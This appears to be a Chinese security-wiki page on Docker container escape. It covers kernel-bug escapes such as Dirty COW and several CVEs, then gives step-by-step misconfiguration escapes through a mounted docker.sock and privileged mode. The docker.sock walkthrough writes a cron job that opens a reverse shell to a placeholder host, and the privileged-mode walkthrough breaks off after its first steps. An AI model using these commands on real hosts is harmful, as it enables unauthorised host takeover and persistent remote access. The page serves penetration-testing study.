# Docker
Docker 是一个开源的引擎可以轻松地为任何应用创建一个轻量级的、可移植的、自给自足的容器。开发者在电脑上编译测试通过的容器可以批量地在生产环境中部署包括 VMs、bare metal、OpenStack 集群和其他的基础应用平台 Docker。
> fofa : app="docker-产品"
**相关文章**
- [Docker容器安全性分析](https://www.freebuf.com/articles/system/221319.html)
- [一些与Docker安全相关的知识点总结与整理](https://mp.weixin.qq.com/s/rKUpyEmurAioiMAFqYzfxg)
- [docker build时的安全问题](https://mp.weixin.qq.com/s/LNXyckCjg2uMNPNl0JWHqg)
- [容器安全事件排查与响应](https://mp.weixin.qq.com/s/rOOr_wCF4egpV_QlRIbtjQ)
**提权检测工具**
- [teamssix/container-escape-check](https://github.com/teamssix/container-escape-check) - 用来检测 Docker 容器中的逃逸方法的脚本
    ```bash
    git clone https://github.com/teamssix/container-escape-check.git
    cd container-escape-check
    chmod +x container-escape-check.sh
    ./container-escape-check.sh
    ```
**相关案例**
- [How We Escaped Docker in Azure Functions](https://www.intezer.com/blog/research/how-we-escaped-docker-in-azure-functions/)
    - [通过Azure Functions提权漏洞实现Dockers逃逸](https://mp.weixin.qq.com/s/6CDbYZh7ChQ_hpuF29tsLA)
**Docker 逃逸**
- [云原生安全 | docker容器逃逸](https://mp.weixin.qq.com/s/zvHrPwYT77oedXloVJHi8g)
- [初识Docker逃逸](https://www.freebuf.com/articles/container/242763.html)
- [干货来啦！带你初探Docker逃逸](https://www.freebuf.com/company-information/205006.html)
- [Docker 逃逸小结第一版](https://paper.seebug.org/1288/)
- [容器逃逸方法 - cdxy](https://www.cdxy.me/?p=818)
---
## 内核漏洞导致的逃逸
**[Dirty COW(CVE-2016-5195)](../../OS安全/OS-Exploits.md#linux)**
- 漏洞描述
    通过 Dirty Cow 漏洞，结合 EXP，就可以返回一个宿主机的高权限 Shell，并拿到宿主机的 root 权限，可以直接操作宿主机的文件。
    VDSO(virtual dvnamic shared object) : 这是一个小型共享库，能将内核自动映射到所有用户程序的地址空间。
    - 举个例子：gettimeofday 是一个获取当前时间的函数，它经常被用户的程序调用，如果一个程序需要知道当前的时间，程序就会频繁的轮询。为了减少资源开销，内核需要把它放在一个所有进程都能访问的内存位置，然后通过 VDSO 定义一个功能来共享这个对象，让进程来访问此信息。通过这种方式，调用的时间和资源花销就大大的降低了，速度也就变得更快。
    - 那么如何利用 VDSO 来实现 Docker 逃逸的？首先 POC 利用 Dirty Cow 漏洞，将 Payload 写到 VDSO 中的一些闲置内存中，并改变函数的执行顺序，使得在执行正常函数之前调用这个 Shellcode。Shellcode 初始化时会检测是否被 root 所调用，如果调用，则继续执行，如果没有调用则返回，并执行 clock_gettime 函数，接下来它会检测 `/tmp/.X` 文件的存在，如果存在，则这时已经是 root 权限了，然后它会打开一个反向的 TCP 链接，为 Shellcode 中填写的 ip 返回一个 Shell,漏洞就这样产生了。
- https://www.ichunqiu.com/experiment/detail?id=100297&source=2
- https://github.com/gebl/dirtycow-docker-vdso
**CVE-2017-7308**
- 相关文章
    - [Linux内核漏洞导致容器逃逸（CVE-2017-7308）](https://github.com/Metarget/metarget/tree/master/writeups_cnv/kernel-cve-2017-7308)
**CVE-2017-1000112**
- 相关文章
    - [Linux内核漏洞导致容器逃逸（CVE-2017-1000112）](https://github.com/Metarget/metarget/tree/master/writeups_cnv/kernel-cve-2017-1000112)
**CVE-2018-18955 Broken uid/gid Mapping for Nested User Namespaces**
- 漏洞描述
    CVE-2018-18955 漏洞涉及到 User 命名空间中的嵌套用户命名空间，用户命名空间中针对 uid（用户ID）和 gid（用户组ID）的 ID 映射机制保证了进程拥有的权限不会逾越其父命名空间的范畴。该漏洞利用创建用户命名空间的子命名空间时损坏的 ID 映射实现提权。
- 相关文章
    - [CVE-2018-18955漏洞学习](https://www.cnblogs.com/likaiming/p/10816529.html)
    - [CVE-2018-18955：较新Linux内核的提权神洞分析](https://www.freebuf.com/vuls/197122.html)
- POC | Payload | exp
    - [Linux - Broken uid/gid Mapping for Nested User Namespaces - Linux local Exploit](https://www.exploit-db.com/exploits/45886)
**CVE-2022-0185**
- 相关文章
    - [[漏洞分析] CVE-2022-0185 linux 内核提权(逃逸)](https://blog.csdn.net/Breeze_CAT/article/details/123007818)
**CVE-2022-0492**
- 相关文章
    - [Linux内核漏洞导致容器逃逸（CVE-2022-0492）](https://github.com/Metarget/metarget/tree/master/writeups_cnv/kernel-cve-2022-0492)
    - [Docker又爆出高危逃逸漏洞了？仔细研究下事情没那么简单](https://mp.weixin.qq.com/s/7KptLnqd7tBLaFKHu-RVuw)
    - [[漏洞分析] CVE-2022-0492 容器逃逸漏洞分析](https://blog.csdn.net/breeze_cat/article/details/123427680)
**CVE-2022-0847**
- [CVE-2022-0847](../../OS安全/OS-Exploits.md#内核漏洞提权)
---
## 配置不当
**利用条件**
- root 权限启动 docker
- 主机上有镜像,或自己下载镜像
- API 版本大于 1.5
**docker.sock 挂载到容器内部**
- 漏洞描述
    Docker 采用 C/S 架构，我们平常使用的 Docker 命令中，docker 即为 client，Server 端的角色由 docker daemon 扮演，二者之间通信方式有以下3种：
    1. unix:///var/run/docker.sock
    2. tcp://host:port
    3. fd://socketfd
    其中使用 docker.sock 进行通信为默认方式，当容器中进程需在生产过程中与 Docker 守护进程通信时，容器本身需要挂载 `/var/run/docker.sock` 文件。
    本质上而言，能够访问 docker socket 或连接 HTTPS API 的进程可以执行 Docker 服务能够运行的任意命令，以 root 权限运行的 Docker 服务通常可以访问整个主机系统。
    因此，当容器访问 docker socket 时，我们可通过与 docker daemonv 的通信对其进行恶意操纵完成逃逸。若容器A可以访问 docker socket，我们便可在其内部安装 client（docker），通过 docker.sock 与宿主机的 server（docker daemon）进行交互，运行并切换至不安全的容器 B，最终在容器 B 中控制宿主机。
- 相关文章
    - [挂载docker.sock导致容器逃逸](https://github.com/Metarget/metarget/tree/master/writeups_cnv/mount-docker-sock)
1. 首先运行一个挂载 `/var/run/` 的容器
    ```bash
    docker pull ubuntu:18.04
    docker run -it -v /var/run/:/host/var/run/ ubuntu:18.04 /bin/bash
    ```
2. 寻找下挂载的 sock 文件
    ```bash
    find / -name docker.sock
    ```
3. 在容器内安装 Docker 作为 client
    ```bash
    echo "deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse" > /etc/apt/sources.list
    echo "deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse" >> /etc/apt/sources.list
    echo "deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse" >> /etc/apt/sources.list
    echo "deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse" >> /etc/apt/sources.list
    echo "deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse" >> /etc/apt/sources.list
    echo "deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse" >> /etc/apt/sources.list
    echo "deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse" >> /etc/apt/sources.list
    echo "deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse" >> /etc/apt/sources.list
    echo "deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse" >> /etc/apt/sources.list
    echo "deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse" >> /etc/apt/sources.list
    apt-get update
    apt-get install -y docker.io vim
    echo "nameserver 114.114.114.114" > /etc/resolv.conf
    ```
4. 查看宿主机 docker 信息
    ```bash
    docker -H unix:///host/var/run/docker.sock info
    ```
5. 运行一个新容器并挂载宿主机根路径
    ```bash
    docker -H unix:///host/var/run/docker.sock run -v /:/aa -it ubuntu:14.04 /bin/bash
    ```
6. 在新容器 /aa 路径下完成对宿主机资源的访问,写入计划任务文件，反弹 shell
    ```bash
    cd /aa
    ls
    echo '* * * * * bash -i >& /dev/tcp/x.x.x.x/9988 0>&1' >> /aa/var/spool/cron/root
    ```
    成功接收到宿主机反弹的 shell
**privileged 特权模式**
- 漏洞描述
    特权模式于版本 0.6 时被引入 Docker，允许容器内的 root 拥有外部物理机 root 权限，而此前容器内 root 用户仅拥有外部物理机普通用户权限。
    使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行 `docker run --privileged` 时，Docker 容器将被允许访问主机上的所有设备，并可以执行 mount 命令进行挂载。
    当控制使用特权模式启动的容器时，docker 管理员可通过 mount 命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。
- 相关文章
    - [特权容器导致容器逃逸](https://github.com/Metarget/metarget/tree/master/writeups_cnv/config-privileged-container)
1. 首先以特权模式运行一个 docker 容器
    ```bash
    docker run -it --privileged=true ubuntu /bin/bash
    ```
2. 查看磁盘文件
    ```bash
    fdisk -l
    ```